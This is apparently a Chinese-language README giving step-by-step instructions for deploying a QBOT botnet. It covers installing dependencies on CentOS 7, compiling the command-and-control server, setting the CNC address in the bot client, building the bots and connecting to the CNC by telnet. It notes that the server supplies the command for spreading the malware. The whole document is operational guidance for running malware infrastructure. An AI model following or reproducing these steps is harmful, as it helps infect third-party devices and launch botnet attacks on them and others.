# 非常哈基米的僵尸网络(QBOT)  
`首先你得有一个centos 7系统`  
然后安装依赖  
```bash
centos的源一般都已经失效了，除非你真的不怕死，你可以用阿里云或者腾讯云，来运行次僵尸网络
备用centos7源安装方式:
curl -o /etc/yum.repos.d/CentOS-Base.repo

http://mirrors.aliyun.com/repo/Centos-7.repo
yum update -y
yum install epel-release -y
yum install vim screen gcc perl wget lbzip bzip2 unzip httpd -y
```
## 然后编译cnc主端  
```bash
gcc server.c -o server -pthread
```
## 编译完主端你就可以先运行了
```bash
#创建一个登录文件
vi login.txt
#格式:
用户名 密码
#然后启动主端
screen ./server 监听僵尸端口 线程 telnet连接端口
ctrl+a+d退出
如果你想查看主端可以先输入指令
screen -ls
查看会话
然后
screen -r 会话名
```
## 更换client.c的cnc 地址和端口
```c
client.c:


unsigned char *commServer[] = {"ip:port", "ip:port"};

```
## 编译僵尸
```python
python bot_install.py
```
## 连接cnc端
```
目前Windows自带的telnet连接不怎么行，跟坨臭屎一样
所以你需要一个Linux系统，乌班图或者centos
有些不自带telnet，自己去搜安装方式
安装完之后
telnet 你的服务器的公网ip 你设置的连接端口
```
## 教程结束，完结撒花
`完事就是这么简单`  
`传马命令他会给出的`  
`后面僵尸自己弄`  
